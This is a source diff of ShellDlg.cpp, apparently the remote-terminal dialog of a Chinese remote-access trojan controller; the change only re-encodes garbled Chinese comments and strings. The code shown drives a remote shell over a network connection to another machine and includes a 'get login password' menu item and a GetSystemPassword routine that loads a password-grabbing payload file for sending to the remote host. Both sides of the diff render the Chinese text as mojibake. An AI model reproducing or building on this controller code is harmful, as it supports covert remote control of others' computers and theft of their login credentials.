@@ -1,4 +1,4 @@
-ï»¿// ShellDlg.cpp : implementation file
+// ShellDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -62,7 +62,7 @@ BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
 	// TODO: Add your specialized code here and/or call the base class
 	if (pMsg->message == WM_KEYDOWN)
 	{
-		// å±è”½VK_ESCAPEã€VK_DELETE
+		// ÆÁ±ÎVK_ESCAPE¡¢VK_DELETE
 		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
 			return true;
 
@@ -81,19 +81,19 @@ BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
 			m_iocpServer->Send(m_pContext, &bEvent, sizeof(bEvent));
 			m_bCanKill = FALSE;
 		}
-		// é™åˆ¶VK_BACK
+		// ÏŞÖÆVK_BACK
 		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
 		{
 			if (m_edit.GetWindowTextLength() <= m_nReceiveLength)
 				return true;
 		}
  	}
-	// Ctrlæ²¡æŒ‰ä¸‹
+	// CtrlÃ»°´ÏÂ
 	if (pMsg->message == WM_CHAR && !HIBYTE(GetKeyState(VK_CONTROL)))
 	{
 		int	len = m_edit.GetWindowTextLength();
 		m_edit.SetSel(len, len);
-		// ç”¨æˆ·åˆ é™¤äº†éƒ¨åˆ†å†…å®¹ï¼Œæ”¹å˜m_nCurSel
+		// ÓÃ»§É¾³ıÁË²¿·ÖÄÚÈİ£¬¸Ä±äm_nCurSel
 		if (len < m_nCurSel)
 			m_nCurSel = len;
 	}
@@ -113,7 +113,7 @@ BOOL CShellDlg::OnInitDialog()
 	if (pSysMenu != NULL)
 	{
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_GET_SYSPSWD, "è·å–ç™»å½•å¯†ç (&P)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_GET_SYSPSWD, "»ñÈ¡µÇÂ¼ÃÜÂë(&P)");
 	}
 
 	m_nCurSel = m_edit.GetWindowTextLength();
@@ -123,12 +123,12 @@ BOOL CShellDlg::OnInitDialog()
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
 	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
-	str.Format("\\\\%s - è¿œç¨‹ç»ˆç«¯", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
+	str.Format("\\\\%s - Ô¶³ÌÖÕ¶Ë", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
 	SetWindowText(str);
 
-	m_edit.SetLimitText(MAXDWORD); // è®¾ç½®æœ€å¤§é•¿åº¦
+	m_edit.SetLimitText(MAXDWORD); // ÉèÖÃ×î´ó³¤¶È
 
-	// é€šçŸ¥è¿œç¨‹æ§åˆ¶ç«¯å¯¹è¯æ¡†å·²ç»æ‰“å¼€
+	// Í¨ÖªÔ¶³Ì¿ØÖÆ¶Ë¶Ô»°¿òÒÑ¾­´ò¿ª
 	BYTE bToken = COMMAND_NEXT;
 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 
@@ -147,7 +147,7 @@ void CShellDlg::OnReceiveComplete()
 	{
 		int	len = m_edit.GetWindowTextLength();
 		m_edit.SetSel(len, len);
-		m_edit.ReplaceSel("è·å–å¯†ç ä¸­, è¯·ç¨å€™......\r\n");
+		m_edit.ReplaceSel("»ñÈ¡ÃÜÂëÖĞ, ÇëÉÔºò......\r\n");
 		GetSystemPassword(2);
 		return;
 	}
@@ -190,8 +190,8 @@ void CShellDlg::GetSystemPassword(UINT nID)
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		CString strText;
-		strText.Format("æ–‡ä»¶ç¼ºå¤±[%s]", strGetPswdFile);
-		MessageBox(strText, "è­¦å‘Š", MB_ICONWARNING);
+		strText.Format("ÎÄ¼şÈ±Ê§[%s]", strGetPswdFile);
+		MessageBox(strText, "¾¯¸æ", MB_ICONWARNING);
 		return;
 	}
 	dwSize = GetFileSize(hFile, NULL);
@@ -210,7 +210,7 @@ void CShellDlg::GetSystemPassword(UINT nID)
 
 void CShellDlg::AddKeyBoardData()
 {
-	// æœ€åå¡«ä¸Š0
+	// ×îºóÌîÉÏ0
 	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
 	CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);
 	
@@ -259,7 +259,7 @@ void CShellDlg::OnChangeEdit()
 	// with the ENM_CHANGE flag ORed into the mask.
 	
 	// TODO: Add your control notification handler code here
-	// ç”¨æˆ·åˆ é™¤äº†éƒ¨åˆ†å†…å®¹ï¼Œæ”¹å˜m_nCurSel
+	// ÓÃ»§É¾³ıÁË²¿·ÖÄÚÈİ£¬¸Ä±äm_nCurSel
 	int len = m_edit.GetWindowTextLength();
 	if (len < m_nCurSel)
 		m_nCurSel = len;
@@ -270,10 +270,10 @@ HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
 	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
 	{
 		COLORREF clr = RGB(190, 190, 190);
-		pDC->SetTextColor(clr);   //è®¾ç½®ç™½è‰²çš„æ–‡æœ¬
+		pDC->SetTextColor(clr);   //ÉèÖÃ°×É«µÄÎÄ±¾
 		clr = RGB(0, 0, 0);
-		pDC->SetBkColor(clr);     //è®¾ç½®é»‘è‰²çš„èƒŒæ™¯
-		return CreateSolidBrush(clr);  //ä½œä¸ºçº¦å®šï¼Œè¿”å›èƒŒæ™¯è‰²å¯¹åº”çš„åˆ·å­å¥æŸ„
+		pDC->SetBkColor(clr);     //ÉèÖÃºÚÉ«µÄ±³¾°
+		return CreateSolidBrush(clr);  //×÷ÎªÔ¼¶¨£¬·µ»Ø±³¾°É«¶ÔÓ¦µÄË¢×Ó¾ä±ú
 	}
 	else
 	{
